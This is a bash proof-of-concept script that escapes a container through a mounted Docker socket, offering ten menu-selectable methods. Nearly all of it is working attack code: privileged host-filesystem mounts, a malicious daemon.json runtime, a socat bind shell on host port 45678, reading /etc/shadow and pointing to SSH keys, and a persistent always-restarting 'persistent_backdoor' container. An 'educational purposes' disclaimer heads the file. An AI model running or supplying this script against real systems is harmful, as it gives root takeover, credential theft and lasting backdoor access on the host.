#!/bin/bash
# Docker Socket Container Escape PoC - Direct API Version
# For educational purposes only
# Use only in authorized testing environments

echo "[*] Docker Socket Container Escape - Direct API Version"
echo "[*] Starting vulnerability check..."

# Check if Docker socket exists in the container
if [ ! -S /var/run/docker.sock ]; then
    echo "[-] Docker socket not found. Container may not be vulnerable."
    exit 1
fi

echo "[+] Docker socket found. Container may be vulnerable."

# Check if curl is available
if ! command -v curl &> /dev/null; then
    echo "[-] curl not found. Installing curl..."
    apt-get update &>/dev/null && apt-get install -y curl &>/dev/null || \
    apk add --no-cache curl &>/dev/null || \
    yum install -y curl &>/dev/null
    
    if ! command -v curl &> /dev/null; then
        echo "[-] Failed to install curl. Exiting."
        exit 1
    fi
fi

# Display menu of escape methods
echo ""
echo "Available escape methods:"
echo "1. Basic privileged container escape (mount host filesystem)"
echo "2. Docker daemon configuration exploit (API version)"
echo "3. Create container with custom capabilities (API version)"
echo "4. Deploy sidecar container with host network (API version)"
echo "5. Direct command execution on host (API version)"
echo "6. Container image build with host access (API version)"
echo "7. Volume mount to access host paths (API version)"
echo "8. Host PID namespace exploitation (API version)"
echo "9. Create exec session via API"
echo "10. Full system compromise (API version)"
echo ""
read -p "Select escape method (1-10): " method

DOCKER_API="v1.41"
HOST_ALPINE_IMAGE="alpine:latest"

# Pull an image first to ensure it's available
echo "[*] Pulling necessary image..."
curl -s --unix-socket /var/run/docker.sock \
    -X POST "http://localhost/${DOCKER_API}/images/create?fromImage=${HOST_ALPINE_IMAGE}&tag=latest" \
    -H "Content-Type: application/json" > /dev/null

case $method in
    1)
        echo "[+] Executing basic privileged container escape via API..."
        
        # Create container configuration
        CONTAINER_CONFIG='{
            "Image": "alpine:latest",
            "Cmd": ["sh", "-c", "echo \"[+] Container escape successful. Now running on the host with root privileges.\"; echo \"[+] Hostname: $(hostname)\"; echo \"[+] Host files: $(ls -la /)\"; sleep 10"],
            "HostConfig": {
                "Privileged": true,
                "PidMode": "host",
                "NetworkMode": "host",
                "Binds": ["/:/hostfs"]
            },
            "Entrypoint": ["chroot", "/hostfs"]
        }'
        
        # Create container via API
        CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/create" \
            -H "Content-Type: application/json" \
            -d "$CONTAINER_CONFIG" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        # Start the container
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/start" \
            -H "Content-Type: application/json"
        
        # Get logs
        sleep 2
        curl -s --unix-socket /var/run/docker.sock \
            -X GET "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/logs?stdout=1" \
            --output - | sed 's/\x01\x00\x00\x00\x00\x00\x00.//'
        
        # Clean up
        curl -s --unix-socket /var/run/docker.sock \
            -X DELETE "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}?force=true" \
            -H "Content-Type: application/json" > /dev/null
        ;;
    
    2)
        echo "[+] Executing Docker daemon configuration exploit via API..."
        
        # Create a malicious Docker daemon config
        echo '{
  "runtimes": {
    "custom": {
      "path": "/tmp/backdoor.sh",
      "runtimeArgs": []
    }
  }
}' > /tmp/daemon.json
        
        # Create container to deploy malicious config
        CONTAINER_CONFIG='{
            "Image": "alpine:latest",
            "Cmd": ["sh", "-c", "cp /tmp/daemon.json /host_etc_docker/daemon.json && echo \"[+] Malicious daemon config deployed. After daemon restart, custom runtime can be used.\""],
            "HostConfig": {
                "Binds": ["/etc/docker:/host_etc_docker", "/tmp/daemon.json:/tmp/daemon.json"]
            }
        }'
        
        # Create and start container
        CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/create" \
            -H "Content-Type: application/json" \
            -d "$CONTAINER_CONFIG" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/start" \
            -H "Content-Type: application/json"
        
        # Get logs
        sleep 2
        curl -s --unix-socket /var/run/docker.sock \
            -X GET "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/logs?stdout=1" \
            --output - | sed 's/\x01\x00\x00\x00\x00\x00\x00.//'
        
        # Clean up
        curl -s --unix-socket /var/run/docker.sock \
            -X DELETE "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}?force=true" \
            -H "Content-Type: application/json" > /dev/null
        ;;
    
    3)
        echo "[+] Creating container with custom capabilities via API..."
        
        CONTAINER_CONFIG='{
            "Image": "alpine:latest",
            "Cmd": ["sh", "-c", "echo \"[+] Container with SYS_ADMIN capability created.\"; mkdir -p /tmp/host_mount; mount -t proc none /proc; mount --bind / /tmp/host_mount; echo \"[+] Host filesystem mounted at /tmp/host_mount\"; ls -la /tmp/host_mount"],
            "HostConfig": {
                "CapAdd": ["SYS_ADMIN"],
                "SecurityOpt": ["apparmor=unconfined"]
            }
        }'
        
        # Create and start container
        CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/create" \
            -H "Content-Type: application/json" \
            -d "$CONTAINER_CONFIG" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/start" \
            -H "Content-Type: application/json"
        
        # Get logs
        sleep 2
        curl -s --unix-socket /var/run/docker.sock \
            -X GET "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/logs?stdout=1" \
            --output - | sed 's/\x01\x00\x00\x00\x00\x00\x00.//'
        
        # Clean up
        curl -s --unix-socket /var/run/docker.sock \
            -X DELETE "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}?force=true" \
            -H "Content-Type: application/json" > /dev/null
        ;;
    
    4)
        echo "[+] Deploying sidecar container with host network via API..."
        
        CONTAINER_CONFIG='{
            "Image": "alpine:latest",
            "Cmd": ["sh", "-c", "apk add --no-cache socat && socat TCP-LISTEN:45678,fork EXEC:\"/bin/sh\",stderr,pty,setsid,sigint,echo=0 & echo \"[+] Backdoor listener deployed on host network interface port 45678\"; sleep 3600"],
            "HostConfig": {
                "NetworkMode": "host"
            }
        }'
        
        # Create and start container
        CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/create?name=network_escape" \
            -H "Content-Type: application/json" \
            -d "$CONTAINER_CONFIG" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/start" \
            -H "Content-Type: application/json"
        
        # Get logs
        sleep 5
        curl -s --unix-socket /var/run/docker.sock \
            -X GET "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/logs?stdout=1" \
            --output - | sed 's/\x01\x00\x00\x00\x00\x00\x00.//'
        
        echo "[+] Container ${CONTAINER_ID} is running with host network. In a real attack, an attacker would connect to port 45678."
        echo "[+] To clean up: curl -s --unix-socket /var/run/docker.sock -X DELETE 'http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}?force=true'"
        ;;
    
    5)
        echo "[+] Exploiting Docker API to run command on host..."
        
        # Create a script for the host
        echo '#!/bin/sh
echo "[+] This script is running on the host system"
id
hostname
' > /tmp/host_cmd.sh
        chmod +x /tmp/host_cmd.sh
        
        CONTAINER_CONFIG='{
            "Image": "alpine:latest",
            "Cmd": ["/host_cmd.sh"],
            "HostConfig": {
                "Binds": ["/tmp/host_cmd.sh:/host_cmd.sh"]
            },
            "Entrypoint": []
        }'
        
        # Create and start container
        CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/create" \
            -H "Content-Type: application/json" \
            -d "$CONTAINER_CONFIG" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/start" \
            -H "Content-Type: application/json"
        
        # Get logs
        sleep 2
        curl -s --unix-socket /var/run/docker.sock \
            -X GET "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/logs?stdout=1" \
            --output - | sed 's/\x01\x00\x00\x00\x00\x00\x00.//'
        
        # Clean up
        curl -s --unix-socket /var/run/docker.sock \
            -X DELETE "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}?force=true" \
            -H "Content-Type: application/json" > /dev/null
        ;;
    
    6)
        echo "[+] Using Docker image build via API to access host files..."
        
        # Create a Dockerfile
        mkdir -p /tmp/build
        echo 'FROM alpine:latest
COPY /etc/shadow /shadow
CMD cat /shadow && echo "[+] Host shadow file extracted"' > /tmp/build/Dockerfile
        
        # Create a tar file for the build context (with Dockerfile only)
        tar -czf /tmp/build.tar.gz -C /tmp/build .
        
        # Start a build with the root directory as context
        echo "[+] Starting build with host root context..."
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/build?t=shadow_extract&dockerfile=/tmp/build/Dockerfile" \
            -H "Content-Type: application/x-tar" \
            --data-binary @/tmp/build.tar.gz
        
        # Create and start container to see the extracted file
        CONTAINER_CONFIG='{
            "Image": "shadow_extract",
            "Cmd": []
        }'
        
        CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/create" \
            -H "Content-Type: application/json" \
            -d "$CONTAINER_CONFIG" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/start" \
            -H "Content-Type: application/json"
        
        # Get logs
        sleep 2
        curl -s --unix-socket /var/run/docker.sock \
            -X GET "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/logs?stdout=1" \
            --output - | sed 's/\x01\x00\x00\x00\x00\x00\x00.//'
        
        # Clean up
        curl -s --unix-socket /var/run/docker.sock \
            -X DELETE "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}?force=true" \
            -H "Content-Type: application/json" > /dev/null
        ;;
    
    7)
        echo "[+] Abusing volume mounts to access sensitive host paths via API..."
        
        CONTAINER_CONFIG='{
            "Image": "alpine:latest",
            "Cmd": ["sh", "-c", "cat /tmp/shadow | head -5 && echo \"[+] Extracted sensitive host files\"; echo \"[+] SSH keys could be accessed via: /host_root/home/*/.ssh/\""],
            "HostConfig": {
                "Binds": ["/:/host_root", "/etc/shadow:/tmp/shadow"]
            }
        }'
        
        # Create and start container
        CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/create" \
            -H "Content-Type: application/json" \
            -d "$CONTAINER_CONFIG" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/start" \
            -H "Content-Type: application/json"
        
        # Get logs
        sleep 2
        curl -s --unix-socket /var/run/docker.sock \
            -X GET "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/logs?stdout=1" \
            --output - | sed 's/\x01\x00\x00\x00\x00\x00\x00.//'
        
        # Clean up
        curl -s --unix-socket /var/run/docker.sock \
            -X DELETE "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}?force=true" \
            -H "Content-Type: application/json" > /dev/null
        ;;
    
    8)
        echo "[+] Deploying container in host PID namespace via API..."
        
        CONTAINER_CONFIG='{
            "Image": "alpine:latest",
            "Cmd": ["sh", "-c", "echo \"[+] Running in host PID namespace\"; ps aux | grep -E \"sshd|dockerd\" | head -3; echo \"[+] In a real attack, could inject code into host processes\""],
            "HostConfig": {
                "PidMode": "host",
                "Privileged": true
            }
        }'
        
        # Create and start container
        CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/create" \
            -H "Content-Type: application/json" \
            -d "$CONTAINER_CONFIG" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/start" \
            -H "Content-Type: application/json"
        
        # Get logs
        sleep 2
        curl -s --unix-socket /var/run/docker.sock \
            -X GET "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/logs?stdout=1" \
            --output - | sed 's/\x01\x00\x00\x00\x00\x00\x00.//'
        
        # Clean up
        curl -s --unix-socket /var/run/docker.sock \
            -X DELETE "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}?force=true" \
            -H "Content-Type: application/json" > /dev/null
        ;;
    
    9)
        echo "[+] Exploiting Docker API to create exec session..."
        
        # First, create a long-running container
        CONTAINER_CONFIG='{
            "Image": "alpine:latest",
            "Cmd": ["sleep", "1d"]
        }'
        
        # Create and start container
        CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/create?name=exec_container" \
            -H "Content-Type: application/json" \
            -d "$CONTAINER_CONFIG" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/start" \
            -H "Content-Type: application/json"
        
        # Create exec instance
        EXEC_CONFIG='{
            "Cmd": ["sh", "-c", "echo \"[+] Privileged exec session in container\"; mkdir -p /tmp/host && mount --bind / /tmp/host && echo \"[+] Host filesystem mounted at /tmp/host:\" && ls -la /tmp/host/root"],
            "Privileged": true
        }'
        
        EXEC_ID=$(curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/exec" \
            -H "Content-Type: application/json" \
            -d "$EXEC_CONFIG" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        # Start exec instance
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/exec/${EXEC_ID}/start" \
            -H "Content-Type: application/json" \
            -d '{"Detach": false, "Tty": false}'
        
        # Get exec output (this might not always work as expected with the API)
        sleep 2
        echo "[+] Exec session created. In a real attack, the attacker would interact with the shell."
        
        # Clean up
        echo "[+] Cleaning up exec container..."
        curl -s --unix-socket /var/run/docker.sock \
            -X DELETE "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}?force=true" \
            -H "Content-Type: application/json" > /dev/null
        ;;
    
    10)
        echo "[+] Executing full system compromise via API..."
        
        # Create a persistent backdoor container
        CONTAINER_CONFIG='{
            "Image": "alpine:latest",
            "Cmd": ["sh", "-c", "echo \"[+] Persistent privileged container created\"; apk add --no-cache socat openssh; echo \"[+] In a real attack scenario, this container would establish persistence, create backdoor accounts, and maintain access to the host system.\"; tail -f /dev/null"],
            "HostConfig": {
                "Privileged": true,
                "PidMode": "host",
                "NetworkMode": "host",
                "RestartPolicy": {"Name": "always"},
                "Binds": ["/:/host_root"]
            }
        }'
        
        # Create and start container
        CONTAINER_ID=$(curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/create?name=persistent_backdoor" \
            -H "Content-Type: application/json" \
            -d "$CONTAINER_CONFIG" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
        
        curl -s --unix-socket /var/run/docker.sock \
            -X POST "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/start" \
            -H "Content-Type: application/json"
        
        # Get logs
        sleep 5
        curl -s --unix-socket /var/run/docker.sock \
            -X GET "http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}/logs?stdout=1" \
            --output - | sed 's/\x01\x00\x00\x00\x00\x00\x00.//'
        
        echo "[+] Persistent container ${CONTAINER_ID} created."
        echo "[+] In a real attack, an attacker would now have persistent access to the host."
        echo "[+] To clean up: curl -s --unix-socket /var/run/docker.sock -X DELETE 'http://localhost/${DOCKER_API}/containers/${CONTAINER_ID}?force=true'"
        ;;
    
    *)
        echo "[-] Invalid option. Exiting."
        exit 1
        ;;
esac

echo "[+] PoC execution completed."
echo "[+] Warning: In a security testing scenario, don't forget to clean up any containers created."